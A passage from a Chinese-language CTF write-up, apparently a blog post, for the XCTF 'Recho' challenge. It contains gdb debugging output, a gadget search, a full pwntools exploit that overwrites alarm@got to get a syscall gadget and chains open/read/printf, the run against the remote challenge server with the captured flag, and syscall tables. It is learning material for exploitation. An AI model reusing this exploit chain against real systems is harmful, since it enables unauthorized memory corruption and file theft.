operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7fffffffddf8</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40078e</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>Init<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    nop<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7fffffffde00</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7fffffffde50</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7fffffffde08</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4007a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token operator">:</span>    mov    edx<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7fffffffde10</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7fffffffde18</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40088d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">77</span><span class="token operator">></span><span class="token operator">:</span>    add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7fffffffde20</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ffff7de59a0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span><span class="token operator">:</span>    push   rbp<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7fffffffde28</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7fffffffde30</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x00000000004005f0</span> in alarm<span class="token annotation punctuation">@plt</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ 发现其got表地址为<span class="token number">0x601028</span>，此时其got表中还没有alarm真正的地址</code></pre><p>所以我们继续执行</p><pre class=" language-java"><code class="language-java"><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x7ffff7ac8840</span> <span class="token operator">&lt;</span>alarm<span class="token operator">></span><span class="token operator">:</span>    mov    eax<span class="token punctuation">,</span><span class="token number">0x25</span>   <span class="token number">0x7ffff7ac8845</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">5</span><span class="token operator">></span><span class="token operator">:</span>    syscall    <span class="token number">0x7ffff7ac8847</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">7</span><span class="token operator">></span><span class="token operator">:</span>    cmp    rax<span class="token punctuation">,</span><span class="token number">0xfffffffffffff001</span>   <span class="token number">0x7ffff7ac884d</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">13</span><span class="token operator">></span><span class="token operator">:</span>    jae    <span class="token number">0x7ffff7ac8850</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span>   <span class="token number">0x7ffff7ac884f</span> <span class="token operator">&lt;</span>alarm<span class="token operator">+</span><span class="token number">15</span><span class="token operator">></span><span class="token operator">:</span>    ret<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0x7fffffffddf8</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40078e</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>Init<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    nop<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0x7fffffffde00</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x7fffffffde50</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0x7fffffffde08</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x4007a3</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">18</span><span class="token operator">></span><span class="token operator">:</span>    mov    edx<span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0x7fffffffde10</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0032</span><span class="token operator">|</span> <span class="token number">0x7fffffffde18</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x40088d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">77</span><span class="token operator">></span><span class="token operator">:</span>    add    rbx<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token number">0x7fffffffde20</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x7ffff7de59a0</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>_dl_fini<span class="token operator">></span><span class="token operator">:</span>    push   rbp<span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token number">0x7fffffffde28</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0x7fffffffde30</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x400840</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">></span><span class="token operator">:</span>    push   r15<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token function">alarm</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> at <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>syscall<span class="token operator">-</span>template<span class="token punctuation">.</span>S<span class="token operator">:</span><span class="token number">78</span><span class="token number">78</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span>/sysdeps<span class="token operator">/</span>unix<span class="token operator">/</span>syscall<span class="token operator">-</span>template<span class="token punctuation">.</span>S<span class="token operator">:</span> 没有那个文件或目录<span class="token punctuation">.</span>gdb<span class="token operator">-</span>peda$ </code></pre><p>我们执行王dl_resolve和dl_fixup后就来到了alarm函数真正的地址。可以看到在alarm偏移量为5的地方就是syscall。<br>我们可以利用gadgets来修改alarm的got表。这里理应放入0x7ffff7ac8840 我们可以让它+5，然后调用alarm函数i就是直接调用syscall，而且此函数副作用很小调用完后还能返回。所以就能被我们改造成一个syscall_ret的gadget</p><h3 id="ROP艺术–修改alarm-got"><a href="#ROP艺术–修改alarm-got" class="headerlink" title="ROP艺术–修改alarm@got"></a>ROP艺术–修改alarm@got</h3><p>因为要使got里面的真实地址+5所以看看有没有add_Retgadgets</p><pre class=" language-java"><code class="language-java">hunter<span class="token annotation punctuation">@hunter</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>XCTF<span class="token operator">/</span>xctf_challenge$ ROPgadget <span class="token operator">--</span>binary Recho <span class="token operator">--</span>only <span class="token string">"add|ret"</span>Gadgets information<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x00000000004008af</span> <span class="token operator">:</span> add bl<span class="token punctuation">,</span> dh <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008ad</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add bl<span class="token punctuation">,</span> dh <span class="token punctuation">;</span> ret    <span class="token number">0x00000000004008ab</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add bl<span class="token punctuation">,</span> dh <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008ac</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret<span class="token number">0x0000000000400830</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> add cl<span class="token punctuation">,</span> cl <span class="token punctuation">;</span> ret<span class="token number">0x00000000004008ae</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rax<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006f8</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rcx<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret   <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token number">0x000000000040070d</span> <span class="token operator">:</span> add <span class="token keyword">byte</span> ptr <span class="token punctuation">[</span>rdi<span class="token punctuation">]</span><span class="token punctuation">,</span> al <span class="token punctuation">;</span> ret    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token number">0x0000000000400832</span> <span class="token operator">:</span> add cl<span class="token punctuation">,</span> cl <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006f4</span> <span class="token operator">:</span> add eax<span class="token punctuation">,</span> <span class="token number">0x20098e</span> <span class="token punctuation">;</span> add ebx<span class="token punctuation">,</span> esi <span class="token punctuation">;</span> ret<span class="token number">0x000000000040070a</span> <span class="token operator">:</span> add eax<span class="token punctuation">,</span> <span class="token number">0x70093eb</span> <span class="token punctuation">;</span> ret<span class="token number">0x00000000004006f9</span> <span class="token operator">:</span> add ebx<span class="token punctuation">,</span> esi <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b3</span> <span class="token operator">:</span> add esp<span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b2</span> <span class="token operator">:</span> add rsp<span class="token punctuation">,</span> <span class="token number">8</span> <span class="token punctuation">;</span> ret<span class="token number">0x00000000004005b6</span> <span class="token operator">:</span> ret</code></pre><p>因为al可以用pop_rax_ret来控制，所以这里很多gadgets都是可以利用的，这里我选用add byte ptr [rdi], al ; ret</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span>  payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rdi_al_ret<span class="token punctuation">)</span>  <span class="token operator">//</span>这里<span class="token punctuation">[</span><span class="token punctuation">]</span>是取rdi里面的东西作为地址，就是刚好对应取got地址里面的值（真实地址）与al进行add操作这样我们就得到了syscall_ret这样一个伪gadget即alarm_plt<span class="token punctuation">(</span>为啥不是alarm_got<span class="token punctuation">)</span></code></pre><h2 id="ROP艺术–函数无中生有"><a href="#ROP艺术–函数无中生有" class="headerlink" title="ROP艺术–函数无中生有"></a>ROP艺术–函数无中生有</h2><p>open无中生有~~</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#构造fp = open('flag',READONLY)  //open的返回值一般用fp取代</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token operator">//</span><span class="token number">0</span>代表只读payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token operator">//</span>open系统调用号为<span class="token number">2</span><span class="token comment" spellcheck="true">#syscall_ret</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#构造read(fp,bss_stage,100))  //用bss段来保存获取的信息流，然后用打印函数打印即可</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  <span class="token operator">//</span><span class="token number">0</span>，<span class="token number">1</span>表示分别表示标准输入，标准输出，一般其他文件流从<span class="token number">3</span>开始或<span class="token number">4</span>或<span class="token number">5</span>，具体我们可以通过gdb调试修改payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#构造printf(bss_stage)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span></code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./Recho')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'220.249.52.133'</span><span class="token punctuation">,</span><span class="token number">47787</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Recho'</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004008a3</span>pp_rsi_r15_ret <span class="token operator">=</span> <span class="token number">0x00000000004008a1</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x00000000004006fe</span>pop_rax_ret <span class="token operator">=</span> <span class="token number">0x00000000004006fc</span>add_rdi_ret <span class="token operator">=</span> <span class="token number">0x000000000040070d</span>bss_stage <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x200</span>alarm_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>alarm_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'400'</span><span class="token punctuation">)</span> <span class="token operator">//</span>保证能够把payload完整输入payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x38</span>  <span class="token operator">//</span>从IDA很容易看出溢出点<span class="token comment" spellcheck="true">#change the GOT of alarm into syscall_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>alarm_got<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x5</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>add_rdi_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#fd = open('flag',readonly)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rax_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>alarm_plt<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#syscall_ret</span><span class="token comment" spellcheck="true">#read(fd,bss_stage,100)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pp_rsi_r15_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#using printf to print bss_stage</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span> <span class="token operator">//</span><span class="token comment" spellcheck="true">#这步也关键，尽量使字符串长，这样才能将我们的 payload 全部输进去，不然可能因为会有缓 存的问题导致覆盖不完整</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token operator">//</span>送出payload后关闭输入流即可退出<span class="token keyword">while</span>循环ret到我们的rop链上sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x2a</span> bytes<span class="token operator">:</span>    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│    <span class="token operator">*</span>    <span class="token number">00000020</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">90</span> <span class="token number">01</span>                     │AAAA│AAAA│··│    0000002aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x90<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x2d</span> bytes<span class="token operator">:</span>    <span class="token string">'cyberpeace{98de696c1dba243594ce86109c32492f}\n'</span>cyberpeace<span class="token punctuation">{</span>98de696c1dba243594ce86109c32492f<span class="token punctuation">}</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Closed connection to <span class="token number">220.249</span><span class="token punctuation">.</span><span class="token number">52.133</span> port <span class="token number">47787</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading in interactive$  直接输出flag流</code></pre><h2 id="MASS"><a href="#MASS" class="headerlink" title="MASS"></a>MASS</h2><ul><li>在不同的libc文件中各函数可能偏移量有所不同，但是函数的实现一般是一样的所以函数内部偏移一般不变，就像这里alarm函数的sys call位置</li><li>既然有了syscall为啥不构造system：因为没有现成的/bin/sh，所以必然要进行两次输入，第一次输入payload第二次输入/bin/sh，但是输入了payload后就进行shutdown了，关闭了输入流。</li></ul><h3 id="32位系统调用常用"><a href="#32位系统调用常用" class="headerlink" title="32位系统调用常用"></a>32位系统调用常用</h3><table><thead><tr><th align="right">%eax</th><th align="center">Name</th><th align="center">Source</th><th align="center">%ebx</th><th align="center">%ecx</th><th align="center">%edx</th><th align="center">%esx</th><th align="left">%edi</th></tr></thead><tbody><tr><td align="right">1</td><td align="center">sys_exit</td><td align="center">kernel/exit.c</td><td align="center">int</td><td align="center">-</td><td align="center">-</td><td align="center">-</td><td align="left">-</td></tr><tr><td align="right">2</td><td align="center">sys_fork</td><td align="center">arch/i386/kernel/process.c</td><td align="center">struct pt_regs</td><td align="center">-</td><td align="center">-</td><td align="center">-</td><td align="left">-</td></tr><tr><td align="right">3</td><td align="center">sys_read</td><td align="center">fs/read_write.c</td><td align="center">unsigned int</td><td align="center">char * size_t</td><td align="center">-</td><td align="center">-</td><td align="left"></td></tr><tr><td align="right">4</td><td align="center">sys_write</td><td align="center">fs/read_write.c</td><td align="center">unsigned int</td><td align="center">const char * size_t</td><td align="center">-</td><td align="center">-</td><td align="left"></td></tr><tr><td align="right">5</td><td align="center">sys_open</td><td align="center">fs/open.c</td><td align="center">const char *</td><td align="center">int</td><td align="center">int</td><td align="center">-</td><td align="left">-</td></tr><tr><td align="right">11</td><td align="center">sys_execve</td><td align="center">arch/i386/kernel/process.c</td><td align="center">struct pt_regs</td><td align="center">NULL</td><td align="center">NULL</td><td align="center">-</td><td align="left">-</td></tr></tbody></table><h3 id="64位系统调用常用"><a href="#64位系统调用常用" class="headerlink" title="64位系统调用常用"></a>64位系统调用常用</h3><table><thead><tr><th align="right">%rax</th><th align="center">System call</th><th align="center">%rdi</th><th align="center">%rsi</th><th align="center">%rdx</th><th align="center">%r10</th><th align="center">%r8</th><th align="left">%r9</th></tr></thead><tbody><tr><td align="right">0</td><td align="center">sys_read</td><td align="center">unsigned int fd</td><td align="center">char *buf</td><td align="center">size_t count</td><td align="center"></td><td align="center"></td><td 